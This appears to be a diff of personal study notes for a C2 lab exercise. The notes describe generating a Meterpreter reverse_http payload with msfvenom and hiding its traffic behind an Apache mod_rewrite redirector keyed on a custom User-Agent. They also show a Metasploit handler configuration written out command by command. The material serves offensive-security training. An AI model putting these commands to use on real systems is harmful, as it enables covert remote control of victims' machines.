@@ -5,8 +5,8 @@
 - [x] [Task 3  Common C2 Frameworks](#task-3--common-c2-frameworks) [`C2Matrix`](https://docs.google.com/spreadsheets/d/19IjBcl_zuRm-N5D2b9f3Gtk7eh3yCdYC_yGnIHkec7k/edit?usp=sharing)
 - [x] [Task 4  Setting Up a C2 Framework](#task-4--setting-up-a-c2-framework)
 - [x] [Task 5  C2 Operation Basics](#task-5--c2-operation-basics)
-- [ ] [Task 6  Command, Control, and Conquer](#task-6--command-control-and-conquer)
-- [ ] [Task 7  Advanced C2 Setups](#task-7--advanced-c2-setups)
+- [x] [Task 6  Command, Control, and Conquer](#task-6--command-control-and-conquer)
+- [x] [Task 7  Advanced C2 Setups](#task-7--advanced-c2-setups)
 - [x] [Task 8  Wrapping Up](#task-8--wrapping-up)
 
 ---
@@ -557,7 +557,94 @@ a2enmod rewrite && a2enmod proxy && a2enmod proxy_http && a2enmod headers && sys
 ```cmd
 msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o shell.exe
 ```
+- After generating the modified executable and transferring it to a victim, open up Wireshark on your host and use the `HTTP` filter to only view HTTP requests. 
+- After it's started capturing packets, execute the binary on the victim system. 
+- You will notice an HTTP request come in with our modified User-Agent.
+  > ![image](https://user-images.githubusercontent.com/51442719/180653859-1fa44e91-5d38-40c1-aeaf-b5b1d511e197.png)
+  > - *Packet Capture of the modified HTTP Payload with Meterpreter*
+- Now that we have a field we can control in the HTTP Request, let's create an Apache2 mod_rewrite rule that filters on the user agent "NotMeterpreter" and forward it to our Metasploit C2 Server.
 
+#### Modifying the Apache Config File 
+- This section may sound intimidating but is actually quite easy; we will be taking the default Apache config and modifying it to our advantage. 
+- On Debian based systems, the default config can be found at `/etc/apache2/sites-available/000-default.conf`.
+```cmd
+cat /etc/apache2/sites-available/000-default.conf  | grep -v '#'
+```
+- Now that we have a general idea of the Apache2 Config file is structured, we must add a few lines to the config file to enable the Rewrite Engine, add a rewrite condition, and lastly, pass through the Apache 2 Proxy. 
+- This sounds fairly complex, but it's quite simple.
+- To enable the [`Rewrite Engine`](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html), we must add `RewriteEngine On` onto a new line in the VirtualHost section.
+- Now we will be using a Rewrite Condition targeting the HTTP User-Agent. 
+- For a complete list of HTTP Request Targets, see the [`mod_rewrite documentation`](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html) on Apache.org. 
+- Because we only want to match the User-Agent "NotMeterpreter", we need to use some basic Regular Expressions to capture this; adding a ^ signals the beginning of a string and a $ at the end of the series, giving us with "^NotMeterpreter$". 
+- This Regex will only capture the NotMeterpreter User-Agent. 
+- We can add this line `RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"` to our config to (as previously stated) only allow HTTP Requests with the NotMeterpreter user agent to access Metasploit.
+- Lastly, we must forward the request through Apache2, through our proxy, to Metasploit.
+- To do this, we must use the ProxyPass feature of Apache's [`mod_proxy module`](https://httpd.apache.org/docs/2.4/howto/reverse_proxy.html). 
+- To do this, we just need to specify the base URI that the request will be forwarded to (in our case, we just need "/"), and the target we want to forward the request to. 
+- This will vary from setup to set up, but this IP Address will be your C2 server. 
+- In the lab scenario, it will be localhost and port that Metasploit is listening on. This will give us a full config file that looks like so:
+```cmd
+cat /etc/apache2/sites-available/000-default.conf  | grep -v '#'
+```
+
+#### Setting Up Exploit/Multi/Handler
+- To set up Meterpreter properly, we need to make a few modifications; We must set our LHOST argument to the incoming interface that we are expecting connections from, in our lab; this will be 127.0.0.1. 
+- In the real world, this will be your public interface that your Redirector will be connecting to (aka your Public IP Address), and the LPORT will be whatever you like. 
+- For the lab, we will be using TCP/8080; this can be whatever you like in production. 
+- As always, the best practice is to run services over their standard protocols, so HTTP should run on port 80, and HTTPS should run on port 443. 
+- These options will also need to be duplicated for ReverseListenerBindAddress and ReverseListenerBindPort.
+- Next, we need to set up OverrideLHOST - This value will be your redirector's IP Address or Domain Name. 
+- After that, we need to set the OverrideLPORT; this will be the port that the HTTP or HTTPS is running on, on your Redirector. 
+- Lastly, we must set the OverrideRequestHost to true. 
+- This will make Meterpreter respond with the OverrideHost information, so all queries go through the Redirector and not your C2 server. 
+- Now that you understand what must be configured, let's dive into it:
+  > 
+```cmd
+msfconsole
+```
+```cmd
+use exploit/multi/handler
+```
+```cmd
+set payload windows/meterpreter/reverse_http
+```
+```cmd
+set LHOST 127.0.0.1
+```
+```cmd
+set LPORT 8080
+```
+```cmd
+set ReverseListenerBindAddress 127.0.0.1
+```
+```cmd
+set ReverseListenerBindPort 8080
+```
+```cmd
+set OverrideLHOST 192.168.0.44
+```
+```cmd
+set OverrideLPORT 80
+```
+```cmd
+set HttpUserAgent NotMeterpreter
+```
+```cmd
+set OverrideRequestHost true
+```
+```cmd
+run
+```
+- After this has all been set up, running your Meterpreter Reverse Shell should now proxy all communications through your Redirector!
+- For awareness, the diagram below is how our Redirector is set up in our lab; as a reminder, in engagements, you will want to use multiple hosts and DNS records instead of IP Addresses. 
+  > ![image](https://user-images.githubusercontent.com/51442719/180654203-f0101641-46d4-42be-bc9e-83e9bcd33acd.png)
+  > - *Lab Redirector Setup*
+
+### Answer the questions below
+- What setting name that allows you to modify the User Agent field in a Meterpreter payload?
+  > Answer format: [`*************`](#)
+- What setting name that allows you to modify the Host header in a Meterpreter payload?
+  > Answer format: [`**************`](#)
 
 
 ---
